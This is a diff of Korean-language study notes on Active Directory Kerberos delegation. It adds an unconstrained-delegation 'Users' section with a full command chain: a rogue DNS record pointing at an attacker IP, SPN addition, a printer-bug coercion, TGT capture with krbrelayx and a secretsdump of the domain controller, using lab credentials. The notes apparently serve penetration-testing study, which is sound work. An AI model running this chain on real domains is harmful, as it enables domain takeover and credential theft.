@@ -1,11 +1,11 @@
-## Delegation
 - 특정 서비스(A)를 이용하려면 다른 서비스(B)와도 상호작용이 필요한 경우가 있다. 원래대로라면 유저가 B와도 직접 인증/통신을 해야 한다.
 - Delegation은 유저가 B와 직접 상호작용하는 대신, A가 유저의 권한(identity)을 대리하여 B에 접근하는 것을 말한다.
 - 이때 B 입장에서는 A가 아니라 "유저 본인"이 요청한 것처럼 보인다.
 
-### Unconstrained Delegation
+## Unconstrained Delegation
 - 유저가 서비스에 인증하면 그 유저의 TGT 복사본이 서비스에 저장되고, 서비스는 이 TGT로 어떤 서비스든 ST를 요청해 유저 행세를 할 수 있다.
 
+### Computers
 #### Waiting for Privileged User Authentication
 - 서비스 서버를 장악한 뒤, Domain Admin 같은 특권 계정이 로그인해오길 기다렸다가, 그때 LSASS에 저장되는 TGT를 Rubeus로 탈취하는 공격.
 ```powershell
@@ -59,11 +59,43 @@ dir \\dc01.inlanefreight.local\c$
 ls \\dc01.inlanefreight.local\c$
 ```
 
-### Constrained Delegation
+### Users
+- 가짜 DNS 레코드(공격자 IP를 가리킴)를 등록하고, 장악한 Unconstrained Delegation 컴퓨터에 그 DNS 이름으로 SPN(CIFS/fake-machine)을 추가.
+- 피해자가 그 가짜 머신에 SMB 접속을 시도할 때 발급되는 TGS에 TGT가 함께 실려 공격자 머신으로 전송되므로, 이를 가로채 탈취하는 기법이다.
+```powershell
+Import-Module .\PowerView.ps1
+
+Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+```
+```bash
+git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx
+
+python dnstool.py -u INLANEFREIGHT.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.INLANEFREIGHT.LOCAL -d 10.10.14.2 --action add 10.129.1.207
+
+nslookup roguecomputer.inlanefreight.local dc01.inlanefreight.local
+```
+```bash
+# KDC가 roguecomputer를 인식하도록 SPN을 등록해 주는 것.
+python addspn.py -u inlanefreight.local\\pixis -p p4ssw0rd --target-type samname -t sqldev -s CIFS/roguecomputer.inlanefreight.local 
+```
+```bash
+# Printer Bug
+python dementor.py -u pixis -p p4ssw0rd -d inlanefreight.local roguecomputer.inlanefreight.local dc01.inlanefreight.local
+```
+```bash
+sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
+```
+```bash
+export KRB5CCNAME=./DC01\$@INLANEFREIGHT.LOCAL_krbtgt@INLANEFREIGHT.LOCAL.ccache
+
+secretsdump.py -k -no-pass dc01.inlanefreight.local
+```
+
+## Constrained Delegation
 - 서비스(A)가 KDC에 User가 서비스(A)에 접근할 때 썼던 티켓을 그대로 `additional tickets`로 첨부 제출하면서, "이 티켓 속 유저(cname) 자격으로 서비스(B)용 새 ST를 발급해달라"고 요청하는 것(S4U2Proxy)
 - `cname-in-addl-tkt` 플래그를 통해 KDC는 서비스가 아니라 첨부 티켓 속 cname(User) 기준으로 발급 대상을 판단
 - 단, 서비스(A)의 `msDS-AllowedToDelegateTo` 속성에 서비스(B)가 명시되어 있어야만 발급 가능
 
-### Resource-Based Constrained Delegation
+## Resource-Based Constrained Delegation
 - 위임 가능 여부를 자원을 가진 쪽(B)이 자기 객체 속성(msDS-AllowedToActOnBehalfOfOtherIdentity)에 "A를 신뢰한다"고 설정하는 방식,
 - Domain Admin 권한 없이도 B에 대한 쓰기 권한만 있으면 수정 가능하다.
